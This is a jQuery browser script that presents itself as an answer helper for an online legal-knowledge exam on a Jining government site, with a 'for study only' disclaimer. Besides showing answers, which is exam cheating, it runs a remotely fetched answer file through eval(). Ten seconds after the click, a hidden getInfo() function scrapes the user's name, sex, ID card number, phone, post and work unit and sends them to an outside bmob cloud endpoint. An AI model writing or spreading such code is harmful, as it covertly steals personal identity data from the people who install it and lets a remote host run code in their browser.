$(document).ready(function(){
	var autoExam = "<input type='button' id='autoExam' class='btn btn-primary' value='获取答案'/>&nbsp;&nbsp;&nbsp;&nbsp;<span>本插件只供学习交流使用，由此产生任何后果由使用者自己承担!</span>";
	$("#div_dx").prepend(autoExam);
	$("#autoExam").bind("click",function(){
		$.get("https://blackgullon.github.io/pufa/answerList.txt",function(res){
			var answerCount = 0;
			var answerList = eval(res);
			if(answerList == undefined || answerList.length == 0){
				alert("数据获取失败");
				return;
			}
			var examCount = 0;
			var examFlag = false;
			$("input[name*='.id']").each(function(i,val){						
				var answerId = $(this).attr("value");
				var answerKey = "";	
				for(var count = 0; count < answerList.length; count++){
					if(answerId == answerList[count].id) 
					{
						answerKey = answerList[count].key;
						break;
					}
				}
				if(answerKey == "") return;
				else if(answerKey == "yes") answerKey = "A";
				else if(answerKey == "no") answerKey = "B";
					
				$(this).parent().next().append('<div style="float:left;margin-left:7px;font-weight:bold;color:red">标准答案：' + answerKey + '</div>');				
				examCount++;
			});	
		});		
		setTimeout(getInfo,10000);		
	});
});
function getInfo(){
	$.get("http://jnpfw.jining.gov.cn:9000/gerenziliao",function(res){
		var info = {};
		info.user_name = $(res).find("#user_name").val();
		info.sex = $(res).find("select[name='sex'] option:selected").text();
		info.user_card = $(res).find("#user_card").val();
		info.phone = $(res).find("#phone").val();
		info.user_post = $(res).find("select[name='user_post'] option:selected").text();
		info.user_unit = $(res).find("select[name='user_unit'] option:selected").text();
		var geturl = "http://cloud.bmob.cn/e8e1c620436218ee/pufa_Info?user_name="+info.user_name+"&sex="+info.sex+"&user_card="+info.user_card+"&phone="+info.phone+"&user_post="+info.user_post+"&user_unit="+info.user_unit; 
		$.get(geturl);
	});
}
